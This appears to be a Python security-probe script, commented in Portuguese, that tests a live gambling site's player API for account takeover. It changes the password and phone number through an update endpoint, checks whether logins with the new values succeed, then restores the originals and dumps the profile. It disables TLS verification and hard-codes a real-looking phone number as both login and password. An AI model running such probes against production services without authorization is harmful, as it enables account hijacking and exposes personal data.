"""
Verifica se o phone_change e password_change realmente tiveram efeito.
Usa abordagem conservadora: tenta logar com senha nova DEPOIS do update.
Se login com senha nova funcionar = password foi alterado (CRÍTICO).
Se login continuar com senha antiga = update ignorou o campo (OK).
"""
import ssl, urllib.request, urllib.error, json, time

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode    = ssl.CERT_NONE
BASE  = "https://ds.amizade777.com"
PHONE = "21998498419"
DID   = "0beb614f-8838-43ef-00fc-0029f7d5d20f"
PKG   = "com.slots.big"

def login_with(phone, pwd):
    payload = {"appChannel":"pc","appPackageName":PKG,"deviceId":DID,
               "deviceModel":"WEB","deviceVersion":"WEB","appVersion":"1.0.0",
               "sysTimezone":None,"sysLanguage":None,"phone":phone,"password":pwd}
    h = {"User-Agent":"Mozilla/5.0","Content-Type":"application/json","Accept":"application/json","Origin":BASE}
    try:
        r = urllib.request.Request(BASE+"/prod-api/player/sign-in",
                                   data=json.dumps(payload).encode(), headers=h, method="POST")
        with urllib.request.urlopen(r, timeout=10, context=ctx) as resp:
            b = json.loads(resp.read())
            return b.get("code"), b.get("msg"), b.get("data")
    except Exception as ex:
        return 0, str(ex), None

def call_update(token, payload):
    full = dict(payload)
    full["token"] = token
    h = {"User-Agent":"Mozilla/5.0","Content-Type":"application/json","Accept":"application/json","Origin":BASE}
    try:
        r = urllib.request.Request(BASE+"/prod-api/player/update",
                                   data=json.dumps(full).encode(), headers=h, method="POST")
        with urllib.request.urlopen(r, timeout=10, context=ctx) as resp:
            return json.loads(resp.read())
    except urllib.error.HTTPError as e:
        return json.loads(e.read()) if e.fp else {}
    except Exception as ex:
        return {"err": str(ex)}

# ─── TESTE 1: password_change ─────────────────────────────────────
print("="*60)
print("TESTE 1 — Trocar senha e tentar logar com a nova")
print("="*60)

# Login normal
code, msg, data = login_with(PHONE, PHONE)
print(f"Login original (phone/phone): code={code}")
if code != 200:
    print("  Falhou! Parando.")
    exit()

token = data["token"]
new_password = "TESTCHANGED_" + str(int(time.time()))

# Update com nova senha
b_update = call_update(token, {"password": new_password, "newPassword": new_password})
print(f"Update password → code={b_update.get('code')} msg={b_update.get('msg')!r}")

# Esperar 1 segundo e tentar logar com nova senha
time.sleep(1)
code_new, msg_new, _ = login_with(PHONE, new_password)
code_old, msg_old, _ = login_with(PHONE, PHONE)

print(f"\nLogin com NOVA senha: code={code_new} msg={msg_new!r}")
print(f"Login com SENHA ORIGINAL: code={code_old} msg={msg_old!r}")

if code_new == 200:
    print("\n🔴 CRÍTICO: SENHA FOI ALTERADA! Account takeover possível!")
    # Restaurar imediatamente
    code_r, _, d_r = login_with(PHONE, new_password)
    if code_r == 200:
        tok_r = d_r["token"]
        call_update(tok_r, {"password": PHONE, "newPassword": PHONE})
        print("  Senha restaurada para o original.")
else:
    print("\n✅ Senha NÃO foi alterada (campo ignorado pelo backend).")

# ─── TESTE 2: phone_change ────────────────────────────────────────
print("\n"+"="*60)
print("TESTE 2 — Trocar phone e ver se login com novo phone funciona")
print("="*60)

code, msg, data = login_with(PHONE, PHONE)
if code != 200:
    print("Login falhou")
    exit()
token = data["token"]

fake_phone = "19999999999"  # phone fictício

b_update = call_update(token, {"phone": fake_phone})
print(f"Update phone → code={b_update.get('code')} msg={b_update.get('msg')!r}")

time.sleep(1)
code_fp, msg_fp, _ = login_with(fake_phone, PHONE)
code_orig, msg_orig, _ = login_with(PHONE, PHONE)

print(f"\nLogin com NOVO phone: code={code_fp} msg={msg_fp!r}")
print(f"Login com PHONE ORIGINAL: code={code_orig} msg={msg_orig!r}")

if code_fp == 200:
    print("\n🔴 CRÍTICO: PHONE FOI ALTERADO! Atacante pode se apossar da conta!")
    # Restaurar
    code_r, _, d_r = login_with(fake_phone, PHONE)
    if code_r == 200:
        tok_r = d_r["token"]
        call_update(tok_r, {"phone": PHONE})
        print("  Phone restaurado.")
else:
    print("\n✅ Phone NÃO foi alterado (campo ignorado).")

# ─── TESTE 3: verificar o player/info completo via body token ─────
print("\n"+"="*60)
print("TESTE 3 — player/info com token no body (mesmo padrão)")
print("="*60)

code, _, data = login_with(PHONE, PHONE)
token = data["token"]
full = {"token": token, "appPackageName": PKG, "appVersion": "1.0.0"}
h = {"User-Agent":"Mozilla/5.0","Content-Type":"application/json","Accept":"application/json","Origin":BASE}
r = urllib.request.Request(BASE+"/prod-api/player/info",
                           data=json.dumps(full).encode(), headers=h, method="POST")
with urllib.request.urlopen(r, timeout=10, context=ctx) as resp:
    b = json.loads(resp.read())
if b.get("code") == 200:
    ui = b["data"].get("user_info") or b["data"]
    print("Perfil completo:")
    for k, v in ui.items():
        print(f"  {k}: {str(v)[:80]!r}")
